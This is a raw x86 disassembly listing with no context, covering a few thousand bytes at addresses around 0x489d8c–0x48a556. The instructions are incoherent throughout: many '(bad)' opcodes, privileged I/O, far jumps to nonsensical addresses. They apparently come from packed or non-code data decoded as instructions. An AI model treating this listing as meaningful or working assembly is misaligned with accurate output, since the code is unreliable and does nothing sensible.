  489d8c:	fwait
  489d8d:	sti    
  489d8e:	or     ch,BYTE PTR [ebx+0xc]
  489d91:	push   eax
  489d92:	sbb    BYTE PTR [edi],cl
  489d94:	mov    WORD PTR [edx+0x31],ss
  489d97:	and    eax,0x9be75959
  489d9c:	dec    ebp
  489d9d:	dec    eax
  489d9e:	sbb    al,0xf
  489da0:	(bad)  
  489da1:	aas    
  489da2:	mov    edi,0xad7ca9db
  489da7:	mov    dl,0x50
  489da9:	fmul   st,st(3)
  489dab:	xchg   BYTE PTR ds:0xdb330c,ch
  489db1:	and    DWORD PTR [ebp-0x6],0x76ec4539
  489db8:	and    BYTE PTR [edx-0x14d0ff68],cl
  489dbe:	mov    bh,0xdb
  489dc0:	push   cs
  489dc1:	or     DWORD PTR [edx],0xffffffeb
  489dc4:	unpckhps xmm4,xmm1
  489dc7:	inc    edi
  489dc8:	cmp    edi,DWORD PTR [ebp-0x14]
  489dcb:	jb     0x489daf
  489dcd:	dec    esp
  489dce:	sub    DWORD PTR [eax],esp
  489dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489dd1:	adc    BYTE PTR [edx-0x33],0x1d
  489dd5:	in     al,dx
  489dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489dd7:	(bad)  
  489dd8:	xchg   ebx,eax
  489dd9:	dec    ebp
  489dda:	sahf   
  489ddb:	dec    ebx
  489ddd:	sbb    al,al
  489ddf:	mov    al,ds:0xc7a608ce
  489de4:	jle    0x489df9
  489de6:	test   BYTE PTR [edi-0x64],ch
  489de9:	sbb    al,0x3a
  489deb:	jnp    0x489df5
  489ded:	inc    edi
  489dee:	lea    edx,[edx+ecx*4]
  489df1:	test   al,0x5
  489df3:	sbb    ah,bl
  489df5:	ficomp DWORD PTR [edi]
  489df7:	cld    
  489df8:	add    DWORD PTR [ebx],ecx
  489dfa:	mov    cs,WORD PTR [eax]
  489dfc:	xchg   esp,eax
  489dfd:	add    bl,BYTE PTR [esi]
  489dff:	mov    eax,ds:0x4864fcf4
  489e04:	fcom   DWORD PTR [ebp+0x1e]
  489e07:	push   ss
  489e08:	scas   al,BYTE PTR es:[edi]
  489e09:	mov    esp,0xf45d3b14
  489e0e:	push   esi
  489e0f:	mov    ds:0x89da1781,eax
  489e14:	add    DWORD PTR [ecx],edi
  489e16:	pop    ebp
  489e17:	jle    0x489da3
  489e19:	and    al,dh
  489e1b:	data16 xlat BYTE PTR ds:[ebx]
  489e1d:	cwde   
  489e1e:	add    bh,BYTE PTR [esi-0x74ad1bb8]
  489e24:	neg    DWORD PTR [edi]
  489e26:	add    BYTE PTR [edi+eiz*2-0x58fe0d58],bl
  489e2d:	stos   BYTE PTR es:[edi],al
  489e2e:	mov    ebx,0xbc6c082f
  489e33:	dec    edi
  489e34:	add    al,0xd0
  489e36:	inc    esp
  489e37:	cmp    esp,0xfd084dd7
  489e3d:	lods   al,BYTE PTR ds:[esi]
  489e3e:	jl     0x489e1f
  489e40:	push   ebx
  489e41:	push   eax
  489e42:	pushf  
  489e43:	push   edx
  489e44:	push   esi
  489e45:	mov    al,ds:0xfbe37c97
  489e4a:	inc    ebp
  489e4b:	adc    bh,bh
  489e4d:	jl     0x489e4f
  489e4f:	jo     0x489e14
  489e51:	or     BYTE PTR [edx],cl
  489e53:	ret    
  489e54:	je     0x489e8c
  489e56:	or     BYTE PTR [ecx+eax*4],dl
  489e59:	call   ebx
  489e5b:	and    BYTE PTR ds:[eax+eax*2],ch
  489e5f:	cmp    BYTE PTR [eax+0x3b01488d],dh
  489e65:	retf   
  489e66:	je     0xbb4ead64
  489e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489e6d:	adc    eax,0xe52ce475
  489e72:	div    BYTE PTR [edx-0x76]
  489e75:	fidivr DWORD PTR [ebx+0x32114811]
  489e7b:	sub    eax,0x540fc323
  489e80:	push   esi
  489e81:	mov    edi,0x74085d3b
  489e86:	sbb    eax,0xef078da
  489e8b:	sub    eax,0x244ff3aa
  489e90:	mov    DWORD PTR [ebx+0x2a],eax
  489e93:	nop    DWORD PTR [esp+eax*1-0x8]
  489e98:	add    DWORD PTR [esi],esp
  489e9a:	pop    ss
  489e9b:	mov    DWORD PTR [ebx],edx
  489e9d:	cmp    bl,al
  489e9f:	dec    eax
  489ea0:	add    DWORD PTR [ebx],ecx
  489ea2:	add    al,0xdc
  489ea4:	and    cl,BYTE PTR [ebx]
  489ea6:	ja     0x489e9a
  489ea8:	pop    edx
  489ea9:	or     BYTE PTR [edi+0x2ef6c099],cl
  489eaf:	pop    esi
  489eb0:	pop    es
  489eb1:	pop    edi
  489eb2:	fstp   QWORD PTR [ebx]
  489eb4:	xor    DWORD PTR [ecx],eax
  489eb6:	xor    eax,DWORD PTR [ecx+0xa262f81]
  489ebc:	fcomp  st(2)
  489ebe:	add    eax,0xac5f3133
  489ec3:	or     al,0x67
  489ec5:	lods   eax,DWORD PTR ds:[esi]
  489ec6:	and    BYTE PTR [eax-0x51e6198a],dl
  489ecc:	lahf   
  489ecd:	mov    ?,WORD PTR [ecx-0x33]
  489ed0:	idiv   DWORD PTR [esi+0x4286f4a6]
  489ed6:	add    BYTE PTR [eax+0x1516c40e],bh
  489edc:	xchg   DWORD PTR [ebx],eax
  489ede:	push   es
  489edf:	or     al,0xf0
  489ee1:	jns    0x489e81
  489ee3:	out    0x4b,eax
  489ee5:	call   0x51d:0x8827caa3
  489eec:	and    edx,DWORD PTR [eax+0xc7e6cdf]
  489ef2:	inc    DWORD PTR [edi+0x8]
  489ef5:	int    0xd6
  489ef7:	jne    0x489f38
  489ef9:	nop
  489efa:	pop    edi
  489efb:	stos   DWORD PTR es:[edi],eax
  489efc:	jae    0x489f67
  489efe:	call   0xa10:0x14d66861
  489f05:	add    BYTE PTR ds:0x4b9a5cd3,0x8c
  489f0c:	or     ecx,DWORD PTR [edi+0x304a10c]
  489f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489f13:	adc    DWORD PTR [ebp-0x3d],0x5f3f1ce4
  489f1a:	add    al,0xbe
  489f1c:	inc    edi
  489f1d:	je     0x489f31
  489f1f:	push   edi
  489f20:	xor    DWORD PTR [ebx],eax
  489f22:	fild   WORD PTR [ecx]
  489f24:	and    BYTE PTR [ebp-0x5e],cl
  489f27:	mov    ecx,DWORD PTR [edi]
  489f29:	add    BYTE PTR [esp+eiz*2],bh
  489f2c:	push   es
  489f2d:	mov    edx,DWORD PTR [edi-0x15]
  489f30:	fmul   DWORD PTR [ecx+0x60]
  489f33:	gs mov eax,0x446303f
  489f39:	add    BYTE PTR [ecx-0x78d04a0],al
  489f3f:	mov    ecx,DWORD PTR [esi-0x90374ff]
  489f45:	add    al,0x15
  489f47:	add    al,BYTE PTR [ecx]
  489f49:	(bad)  
  489f4a:	in     al,dx
  489f4b:	lock mov edi,esi
  489f4e:	outs   dx,DWORD PTR ds:[esi]
  489f4f:	cmp    ch,BYTE PTR [ecx]
  489f51:	or     dh,dl
  489f53:	(bad)  
  489f54:	jle    0x489f91
  489f56:	push   ebp
  489f57:	jge    0x489f49
  489f59:	cmp    DWORD PTR ds:0x80ffe61,ebx
  489f5f:	(bad)  
  489f60:	shl    DWORD PTR [ebx],1
  489f62:	add    al,BYTE PTR [eax]
  489f64:	push   0xa57bdd24
  489f69:	in     eax,0x3b
  489f6b:	fild   WORD PTR [esi+ebp*8-0x7ad45e20]
  489f72:	adc    eax,0x1879d6c7
  489f77:	loope  0x489efb
  489f79:	inc    eax
  489f7a:	call   0x5efb4d62
  489f7f:	push   edx
  489f80:	push   es
  489f81:	xor    edx,edx
  489f83:	mov    bh,BYTE PTR [ebx]
  489f85:	ret    0x8033
  489f88:	outs   dx,DWORD PTR ds:[esi]
  489f89:	stos   DWORD PTR es:[edi],eax
  489f8a:	xor    bh,cl
  489f8c:	(bad)  
  489f8e:	adc    ch,BYTE PTR [ecx]
  489f90:	cmp    bh,ch
  489f92:	mov    ah,0x8e
  489f94:	mov    ah,0x8b
  489f96:	pop    esi
  489f97:	add    al,0x50
  489f99:	push   esp
  489f9a:	mov    edx,ecx
  489f9c:	outs   dx,DWORD PTR ds:[esi]
  489f9d:	mov    edx,0xc53e4e56
  489fa2:	daa    
  489fa3:	inc    esi
  489fa4:	add    al,0x88
  489fa6:	movzx  eax,WORD PTR [eax+0x8]
  489faa:	fnstcw WORD PTR es:[ebx+edx*8+0x35f82eb6]
  489fb2:	sub    al,0xff
  489fb4:	inc    eax
  489fb5:	or     BYTE PTR [edi],bh
  489fb7:	xor    al,0xf8
  489fb9:	mov    ch,0x15
  489fbb:	movsx  ebx,WORD PTR [eax-0x2a]
  489fbf:	sti    
  489fc0:	inc    ecx
  489fc1:	mov    ss,eax
  489fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489fc4:	inc    ecx
  489fc5:	push   0xffffffff
  489fc7:	cmp    BYTE PTR [edx-0x39770b26],dh
  489fcd:	aam    0x50
  489fcf:	pop    ebx
  489fd0:	and    dl,BYTE PTR [esi-0x5e]
  489fd3:	pop    ss
  489fd4:	sbb    ch,BYTE PTR [eax]
  489fd6:	data16 aam 0xfd
  489fd9:	push   ebp
  489fda:	loopne 0x48a00d
  489fdc:	rcl    BYTE PTR [esi-0x5d],1
  489fdf:	cmp    ebp,DWORD PTR [ecx-0x7da1e784]
  489fe5:	xchg   ecx,eax
  489fe6:	ror    DWORD PTR [edx-0x5],cl
  489fe9:	test   BYTE PTR [eax],dl
  489feb:	jg     0x48a013
  489fed:	jns    0x48a064
  489fef:	hlt    
  489ff0:	lock add ecx,DWORD PTR [ebp+0x3b]
  489ff4:	fistp  QWORD PTR [edi+ebx*4]
  489ff7:	mov    cs,WORD PTR [edx-0x12c7212c]
  489ffd:	leave  
  489ffe:	sub    ah,BYTE PTR [edx+0xfff7c7e]
  48a004:	cli    
  48a005:	jmp    0x142f:0x12763d7e
  48a00c:	test   BYTE PTR [eax-0x2ff0f9d6],0xd
  48a013:	jle    0x48a024
  48a015:	js     0x48a01d
  48a017:	cmp    BYTE PTR [eax+0x77dd0ed6],0xd
  48a01e:	mov    ch,0x33
  48a020:	dec    esi
  48a021:	xchg   edi,eax
  48a022:	sub    dl,BYTE PTR [ecx]
  48a024:	cmp    eax,0xce068d6e
  48a029:	shr    DWORD PTR [esi],cl
  48a02b:	push   0x3f
  48a02d:	cld    
  48a02e:	push   edx
  48a02f:	jl     0x48a060
  48a031:	pop    es
  48a032:	or     cl,bl
  48a034:	and    al,al
  48a036:	cs or  al,0x0
  48a039:	les    eax,FWORD PTR [edx+eax*4]
  48a03c:	les    eax,FWORD PTR [eax-0x152a912a]
  48a042:	mov    al,ds:0x8ab50298
  48a047:	js     0x48a09b
  48a049:	fisub  DWORD PTR [edi]
  48a04b:	xchg   DWORD PTR [ecx-0x4a08e813],eax
  48a051:	push   edx
  48a052:	inc    ebx
  48a053:	scas   al,BYTE PTR es:[edi]
  48a054:	loop   0x48a03a
  48a056:	js     0x489fed
  48a058:	test   BYTE PTR [ebx-0xe316e70],dl
  48a05e:	mov    ebp,0x6bdc09db
  48a063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a064:	or     al,0xf7
  48a066:	out    0x8b,al
  48a068:	inc    DWORD PTR [eax-0x4c3a57da]
  48a06e:	jne    0x48a00e
  48a070:	xlat   BYTE PTR ds:[ebx]
  48a071:	mov    esi,0xd4c706b7
  48a076:	pop    ds
  48a077:	dec    esi
  48a078:	adc    dh,ch
  48a07a:	inc    ebx
  48a07b:	js     0x489ffd
  48a07d:	cmp    eax,0x8ab2f018
  48a082:	or     DWORD PTR [edx+ecx*1+0x16],edi
  48a086:	cmp    BYTE PTR [edx],dh
  48a088:	ror    bl,0x87
  48a08b:	stos   DWORD PTR es:[edi],eax
  48a08c:	or     al,dl
  48a08e:	pop    ds
  48a08f:	dec    esp
  48a090:	cmp    BYTE PTR [eax+0x6b0807d7],0x87
  48a097:	idiv   DWORD PTR ds:0xdc8e0f3c
  48a09d:	outs   dx,DWORD PTR ds:[esi]
  48a09e:	ds mov esi,0x4045ab8d
  48a0a4:	mov    DWORD PTR [esp+0x24],edi
  48a0a8:	mov    DWORD PTR [ebx],ebp
  48a0aa:	cmp    BYTE PTR [ecx],al
  48a0ac:	add    bh,BYTE PTR [eax-0x75959536]
  48a0b2:	cmp    BYTE PTR [edi-0x78229304],0x7b
  48a0b9:	mov    ebx,0xf014487
  48a0be:	pop    esp
  48a0bf:	or     al,0x2b
  48a0c1:	or     BYTE PTR [edi+0x76],ch
  48a0c4:	jg     0x48a0f8
  48a0c6:	and    eax,0xfcc00149
  48a0cb:	jmp    0x48a13b
  48a0cd:	lahf   
  48a0ce:	jecxz  0x48a145
  48a0d0:	inc    esp
  48a0d1:	adc    BYTE PTR [eax-0x7a],ch
  48a0d4:	dec    edx
  48a0d5:	sub    edi,DWORD PTR [eax-0x60]
  48a0d8:	mov    esi,DWORD PTR ds:0x5482708
  48a0de:	loope  0x48a10c
  48a0e0:	or     eax,0xba770237
  48a0e5:	sub    eax,0x50784c7e
  48a0ea:	call   esi
  48a0ec:	imul   esi,DWORD PTR [eax-0x33199afe],0xbf77c3ac
  48a0f6:	jbe    0x48a14a
  48a0f8:	cmp    DWORD PTR [edi-0x4ee76908],0x4e
  48a0ff:	mov    ebp,0x39508724
  48a104:	ror    dh,cl
  48a106:	jns    0x48a154
  48a108:	in     al,dx
  48a109:	sbb    al,0x46
  48a10b:	pusha  
  48a10c:	shl    BYTE PTR [ebx+0x33ae4eca],0x29
  48a113:	inc    esi
  48a114:	cmp    al,0x4d
  48a116:	ins    DWORD PTR es:[edi],dx
  48a117:	inc    edi
  48a118:	add    cl,bl
  48a11a:	cmp    BYTE PTR [ebx-0x49],0x6b
  48a11e:	sub    DWORD PTR [esp+edi*1+0xa40ad4e],0xc5ba87b0
  48a129:	or     edi,0x7b
  48a12c:	dec    ecx
  48a12d:	xchg   eax,edi
  48a12f:	mov    ds:0xcd1cda07,eax
  48a134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a135:	jmp    0x4a94d8f8
  48a13a:	adc    DWORD PTR [ecx],ecx
  48a13c:	inc    ebx
  48a13d:	add    cl,ah
  48a13f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a140:	mov    ecx,0x1cf34
  48a145:	add    eax,ebx
  48a147:	add    al,0xba
  48a149:	shr    BYTE PTR [ecx+0x2e],0xcd
  48a14d:	add    eax,0xd8a806b1
  48a152:	out    dx,al
  48a153:	hlt    
  48a154:	or     BYTE PTR [eax],dl
  48a156:	(bad)  
  48a157:	hlt    
  48a158:	sbb    eax,ecx
  48a15a:	inc    ecx
  48a15b:	mov    DWORD PTR [esi],edx
  48a15d:	cmp    eax,DWORD PTR ds:0x485fa76f
  48a163:	mov    esi,DWORD PTR [esp+ecx*2-0x5371b0fe]
  48a16a:	push   cs
  48a16b:	rcl    DWORD PTR [ebp-0x1f020c55],0x4
  48a172:	add    eax,DWORD PTR ds:0x842c912c
  48a178:	popf   
  48a179:	and    BYTE PTR [esi+0x5c],cl
  48a17c:	add    eax,esp
  48a17e:	push   esi
  48a17f:	hlt    
  48a180:	and    al,0x14
  48a182:	mov    edx,DWORD PTR [ecx]
  48a184:	mov    BYTE PTR [edx+0x66],0xc3
  48a188:	jne    0x48a1ca
  48a18a:	shl    DWORD PTR [esi],0x6c
  48a18d:	pusha  
  48a18e:	xchg   DWORD PTR [ecx-0x61],ebp
  48a191:	pushf  
  48a192:	lds    ebx,FWORD PTR [eax-0x28]
  48a195:	lock pusha 
  48a197:	and    BYTE PTR [edi-0x3],bh
  48a19a:	(bad)  [edx]
  48a19c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a19d:	push   0x20f0bbe
  48a1a2:	dec    eax
  48a1a3:	sub    esi,DWORD PTR [ebx]
  48a1a5:	mov    ecx,0x5a0ae020
  48a1aa:	xor    al,0x34
  48a1ac:	mov    edx,0xf7da2699
  48a1b1:	in     al,dx
  48a1b2:	push   ebx
  48a1b3:	test   BYTE PTR [edi+0x4c],0x51
  48a1b7:	pushf  
  48a1b8:	push   ss
  48a1b9:	and    al,0xcc
  48a1bb:	pop    eax
  48a1bc:	(bad)  
  48a1bd:	push   cs
  48a1be:	pusha  
  48a1bf:	dec    ebp
  48a1c0:	aaa    
  48a1c1:	test   bh,ah
  48a1c3:	jg     0x48a1db
  48a1c5:	fs pop eax
  48a1c7:	xchg   BYTE PTR [ebp+0x27],dh
  48a1ca:	dec    ebp
  48a1cb:	in     eax,dx
  48a1cc:	adc    DWORD PTR ds:0x4a142e80,0x5409482
  48a1d6:	sbb    BYTE PTR [edi+0x5424744c],0x68
  48a1dd:	sbb    eax,0x88f8127d
  48a1e2:	xchg   DWORD PTR [esi+0xc],edx
  48a1e5:	es xchg edi,eax
  48a1e7:	sar    BYTE PTR [ebx+0x21],0xc2
  48a1eb:	cs push ebp
  48a1ed:	test   BYTE PTR [esp+ebp*2+0x50],dl
  48a1f1:	sar    BYTE PTR [ebx+eiz*1+0x3f],cl
  48a1f5:	mov    ds:0xb1024c99,eax
  48a1fa:	adc    DWORD PTR ds:0x976a27bf,eax
  48a200:	out    0xb,al
  48a202:	les    ecx,FWORD PTR [edx+ebp*4]
  48a205:	(bad)
  48a209:	arpl   WORD PTR [edx],ax
  48a20b:	fwait
  48a20c:	mov    ds:0x1a7ec048,al
  48a211:	dec    esp
  48a212:	sub    ebp,DWORD PTR [edi+0x14655c05]
  48a218:	xchg   esi,eax
  48a219:	add    BYTE PTR [ebx+ebp*4],cl
  48a21c:	jg     0x48a22b
  48a21e:	cs ret 0xbca3
  48a222:	int3   
  48a223:	xor    DWORD PTR [ebp+0x20],0xffffff8c
  48a227:	and    al,0xb8
  48a229:	push   ebp
  48a22a:	test   BYTE PTR [edi],dl
  48a22c:	add    bl,BYTE PTR [esi+0x51c40d61]
  48a232:	mov    ds:0x4181e48b,al
  48a237:	not    dh
  48a239:	mov    ebx,edi
  48a23b:	(bad)  
  48a23c:	pop    ds
  48a23d:	cdq    
  48a23e:	nop
  48a23f:	jl     0x48a1fd
  48a241:	jmp    0x474c7824
  48a246:	dec    ebx
  48a247:	push   es
  48a248:	mov    ah,0x7f
  48a24a:	mov    bl,0x3c
  48a24c:	icebp  
  48a24d:	out    0xc7,eax
  48a24f:	jg     0x48a2bb
  48a251:	or     bh,bh
  48a253:	adc    eax,0x6448215c
  48a258:	lock add dh,BYTE PTR [ebp+eiz*1-0x75]
  48a25d:	mov    bh,0xb6
  48a25f:	sbb    eax,eax
  48a261:	dec    edi
  48a262:	int3   
  48a263:	inc    ecx
  48a264:	mov    bh,0x5c
  48a266:	adc    cl,dl
  48a268:	jl     0x48a1ea
  48a26a:	jecxz  0x48a25a
  48a26c:	mov    esi,0x936cd98a
  48a271:	xor    al,0x3b
  48a273:	xchg   DWORD PTR [ebx+0xf],eax
  48a276:	add    DWORD PTR [edi-0x7f580ea],0xffffffb1
  48a27d:	push   edi
  48a27e:	push   cs
  48a27f:	mov    WORD PTR [ebp+0x59],fs
  48a282:	into   
  48a283:	mov    esp,0x12269b0
  48a288:	rol    DWORD PTR [ebx-0xeed93c8],0x86
  48a28f:	sub    edx,DWORD PTR [esi+eiz*2+0x68dcd842]
  48a296:	push   ecx
  48a297:	mov    ecx,0xf3f6c830
  48a29c:	loopne 0x48a298
  48a29e:	sub    cl,al
  48a2a0:	dec    esp
  48a2a1:	sub    DWORD PTR [ebp-0x44addbac],ecx
  48a2a7:	xor    eax,0x6c33f300
  48a2ac:	push   ss
  48a2ad:	lea    eax,[esi+eiz*8-0x1a]
  48a2b1:	call   0x1461:0x4825ecb6
  48a2b8:	les    esp,FWORD PTR [esi]
  48a2ba:	sbb    edx,DWORD PTR [edx+ecx*8-0x3f]
  48a2be:	fist   DWORD PTR [edi-0x30d7bae]
  48a2c4:	shr    bl,cl
  48a2c6:	mov    al,ds:0xf978f78b
  48a2cb:	arpl   WORD PTR [eax+ebp*1+0x1d1282d3],si
  48a2d2:	sub    al,BYTE PTR [ebp+0x77e3600e]
  48a2d8:	loopne 0x48a278
  48a2da:	sbb    DWORD PTR [ecx],eax
  48a2dc:	mov    DWORD PTR [edi-0x1eaa48d9],ebx
  48a2e2:	mov    WORD PTR [eax],es
  48a2e4:	fbstp  TBYTE PTR [ebx-0x1bfe8e67]
  48a2ea:	std    
  48a2eb:	fbld   TBYTE PTR [esi]
  48a2ed:	or     ebx,DWORD PTR [ebx+eiz*2+0x8]
  48a2f1:	int    0x63
  48a2f3:	or     al,0xbc
  48a2f5:	es adc eax,0xaddb0de4
  48a2fb:	mov    ah,0x52
  48a2fd:	sbb    BYTE PTR [eax],cl
  48a2ff:	xor    eax,0xa2ef0ab8
  48a304:	dec    eax
  48a305:	xlat   BYTE PTR ds:[ebx]
  48a306:	adc    al,0x4f
  48a308:	jne    0x48a2a6
  48a30a:	adc    DWORD PTR [esi+0x545bfdaa],ecx
  48a310:	fimul  WORD PTR ds:0x7566be12
  48a316:	xchg   esp,eax
  48a317:	push   0x16e01706
  48a31c:	xchg   ebx,eax
  48a31d:	jl     0x48a347
  48a31f:	imul   BYTE PTR [ecx+0xe]
  48a322:	je     0x48a324
  48a324:	add    al,0x1
  48a326:	add    DWORD PTR [edx+eax*1],eax
  48a329:	add    al,0x80
  48a32b:	add    BYTE PTR [ebx-0x80],al
  48a32e:	add    edi,DWORD PTR [edi-0x7f]
  48a331:	pop    ss
  48a332:	add    bl,dh
  48a334:	aam    0x0
  48a336:	or     ah,BYTE PTR [edx+0x5a910033]
  48a33c:	jg     0x48a345
  48a33e:	or     dl,cl
  48a340:	mov    ds:0x28b0e17,eax
  48a345:	mov    esi,DWORD PTR [eax]
  48a347:	gs mov ebp,0x6a0806c0
  48a34d:	enter  0xb648,0x0
  48a351:	add    ebp,DWORD PTR [eax-0x5f]
  48a354:	mov    dl,BYTE PTR [ecx+0x30]
  48a357:	cmp    BYTE PTR [eax],cl
  48a359:	pushf  
  48a35a:	or     eax,0x2e4cb570
  48a35f:	outs   dx,BYTE PTR ds:[esi]
  48a360:	mov    eax,DWORD PTR [ecx]
  48a362:	mov    esp,0x505643ad
  48a367:	dec    edx
  48a368:	cmp    al,0x67
  48a36a:	pcmpgtd mm1,QWORD PTR es:[ecx]
  48a36e:	out    0x6e,eax
  48a370:	add    BYTE PTR [ebp+ecx*8-0x7cf74047],bl
  48a377:	mov    ecx,0xd65b1340
  48a37c:	sub    al,BYTE PTR [ecx]
  48a37e:	js     0x48a377
  48a380:	scas   al,BYTE PTR es:[edi]
  48a381:	add    DWORD PTR [edx+edx*2+0x44],ebp
  48a385:	mov    edi,esi
  48a387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a388:	xor    BYTE PTR [edi+0x0],bl
  48a38b:	push   ss
  48a38c:	adc    DWORD PTR [ebx],ecx
  48a38e:	out    dx,al
  48a38f:	mov    al,0x69
  48a391:	test   DWORD PTR [ecx-0x7a26c37f],0x341a4098
  48a39b:	xchg   BYTE PTR [eax-0xb],dl
  48a39e:	sbb    al,0x84
  48a3a0:	repnz mov DWORD PTR [esp+ebx*1],eax
  48a3a4:	test   edx,0xacfe7471
  48a3aa:	cmp    esp,DWORD PTR [esi]
  48a3ac:	stos   BYTE PTR es:[edi],al
  48a3ad:	call   0x22b4dbc0
  48a3b2:	lock out dx,al
  48a3b4:	shl    BYTE PTR [eax+ebp*1-0x79],cl
  48a3b8:	mov    eax,DWORD PTR [esi]
  48a3ba:	jmp    0x48a3c3
  48a3bc:	aas    
  48a3bd:	adc    al,al
  48a3bf:	imul   edx,DWORD PTR [edi],0x313b66c4
  48a3c5:	cmp    al,0xc5
  48a3c7:	jo     0x48a374
  48a3c9:	fidivr WORD PTR [ebp+0x788beb27]
  48a3cf:	fidivr WORD PTR [eax+edi*2]
  48a3d2:	jne    0x48a3ee
  48a3d4:	pop    edi
  48a3d5:	sbb    BYTE PTR [eax],bl
  48a3d7:	mov    ah,0x5c
  48a3d9:	cmp    DWORD PTR [esi+0x6ba6640],ecx
  48a3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a3e0:	adc    BYTE PTR [ebx-0x1e],dl
  48a3e3:	jge    0x48a373
  48a3e5:	cmc    
  48a3e6:	push   eax
  48a3e7:	lods   eax,DWORD PTR ds:[esi]
  48a3e8:	mov    eax,ds:0x48ec8bb5
  48a3ed:	sbb    BYTE PTR [ecx+0x10125c3e],cl
  48a3f3:	je     0x48a37e
  48a3f5:	fs inc esp
  48a3f7:	dec    edx
  48a3f8:	mov    eax,0xcc2a0166
  48a3fd:	mov    esp,0x7e0160f9
  48a402:	mov    esp,0x513c820c
  48a407:	or     bh,BYTE PTR [eax-0x6ab77675]
  48a40d:	loope  0x48a391
  48a40f:	rcr    ah,0x73
  48a412:	pushf  
  48a413:	inc    eax
  48a414:	pop    edi
  48a415:	in     eax,dx
  48a416:	add    DWORD PTR [edx-0x24],eax
  48a419:	das    
  48a41a:	pop    eax
  48a41b:	and    BYTE PTR [edx-0x42a887d8],dh
  48a421:	sub    eax,0x348b2c16
  48a426:	xchg   BYTE PTR [eax],al
  48a428:	jle    0x48a432
  48a42a:	inc    edi
  48a42b:	es xor ah,bh
  48a42e:	sahf   
  48a42f:	test   esi,0x63426e8
  48a435:	cmp    BYTE PTR [esi+eiz*1],bh
  48a438:	pusha  
  48a439:	je     0x48a3f3
  48a43b:	pop    edi
  48a43c:	repz out dx,eax
  48a43e:	mov    ecx,0x6c766864
  48a443:	jne    0xf889a3d8
  48a449:	jl     0x48a3d6
  48a44b:	xor    eax,0xd0bf7bde
  48a450:	and    BYTE PTR [eax],bl
  48a452:	xor    esi,esi
  48a454:	push   ss
  48a455:	push   esp
  48a456:	enter  0xf44b,0x81
  48a45a:	cmp    BYTE PTR [edx],cl
  48a45c:	push   esi
  48a45d:	cld    
  48a45e:	push   es
  48a45f:	test   al,0xf9
  48a461:	inc    edi
  48a462:	jge    0x48a467
  48a464:	inc    eax
  48a465:	jmp    0x48a437
  48a467:	jmp    0x528302b3
  48a46c:	ds pop esp
  48a46e:	jnp    0x48a4b9
  48a470:	push   0x85560c0a
  48a475:	and    al,0xd
  48a477:	cmp    BYTE PTR [eax-0x50],ch
  48a47a:	out    dx,al
  48a47b:	sub    eax,DWORD PTR [ebp+eiz*2+0x4ab80f7]
  48a482:	fcom   QWORD PTR [edi]
  48a484:	xor    dh,BYTE PTR [edx-0x2ffff072]
  48a48a:	(bad)  
  48a48c:	shl    bh,cl
  48a48e:	push   esp
  48a48f:	push   eax
  48a490:	enter  0x3970,0x6
  48a494:	pop    esp
  48a495:	xor    al,0xc1
  48a497:	sub    BYTE PTR [ecx],dh
  48a499:	repnz pusha 
  48a49b:	push   0x78031076
  48a4a0:	into   
  48a4a1:	push   0xd83d5016
  48a4a6:	adc    al,0xe8
  48a4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a4a9:	and    BYTE PTR [eax-0x1],dl
  48a4ac:	in     eax,dx
  48a4ad:	push   ebx
  48a4ae:	add    edi,DWORD PTR [esp+ecx*1+0x10]
  48a4b2:	inc    DWORD PTR [esi+0x70]
  48a4b5:	lea    eax,[eax+ecx*4]
  48a4b8:	mov    ecx,DWORD PTR [eax]
  48a4ba:	xor    edi,edi
  48a4bc:	xor    cl,BYTE PTR [esp+ecx*1]
  48a4bf:	push   cs
  48a4c0:	lock (bad) [esi+0x39]
  48a4c4:	jns    0x48a4ae
  48a4c6:	ret    0xd868
  48a4c9:	dec    edi
  48a4ca:	xor    DWORD PTR [esi],ecx
  48a4cc:	mov    dl,0x48
  48a4ce:	loopne 0x48a461
  48a4d0:	xor    esi,DWORD PTR [edx+eax*1+0x36]
  48a4d4:	mov    ds:0xf03cfdb0,al
  48a4d9:	push   0x42f03b6c
  48a4de:	dec    ebx
  48a4df:	or     eax,0x7082205f
  48a4e4:	mov    dh,0x47
  48a4e6:	data16 mov BYTE PTR [eax],bl
  48a4e9:	add    eax,0xc160bdf
  48a4ee:	clc    
  48a4ef:	add    al,0xb2
  48a4f1:	inc    esi
  48a4f2:	mov    DWORD PTR [esi-0x7c],edx
  48a4f5:	fild   DWORD PTR [edx-0x7b0e3349]
  48a4fb:	ja     0x48a527
  48a4fd:	data16 sub al,0x2
  48a500:	mov    ch,0x51
  48a502:	sub    BYTE PTR [ecx],bh
  48a504:	jb     0x48a56a
  48a506:	pop    es
  48a507:	scas   eax,DWORD PTR es:[edi]
  48a508:	mov    ebx,0xe500d700
  48a50d:	add    BYTE PTR [ebx-0x15e35e2d],cl
  48a513:	add    ah,al
  48a515:	add    ebx,edx
  48a517:	cmp    BYTE PTR [edi+0x28],bl
  48a51a:	xchg   esp,eax
  48a51b:	cmp    BYTE PTR [ebx],cl
  48a51d:	push   cs
  48a51e:	and    BYTE PTR [eax],al
  48a520:	xor    al,0xa0
  48a522:	clc    
  48a523:	xor    al,0x9
  48a525:	and    ecx,DWORD PTR [ebx+0x5c33027c]
  48a52b:	repz mov al,ds:0xd802b3b9
  48a531:	ror    DWORD PTR [esi+0x62781ed2],1
  48a537:	mov    DWORD PTR [ebx-0x78],0x4cbfeaa
  48a53e:	xor    eax,0x7c54ad80
  48a543:	mov    DWORD PTR [ebx],edx
  48a545:	pop    esi
  48a546:	fmul   QWORD PTR [esi]
  48a548:	cs js  0x48a57d
  48a54b:	dec    ebp
  48a54c:	or     al,0x54
  48a54e:	mov    bh,0x46
  48a550:	push   ebx
  48a551:	push   esi
  48a552:	cmp    al,0xcc
  48a554:	mov    bh,0xfc
  48a556:	push   esi
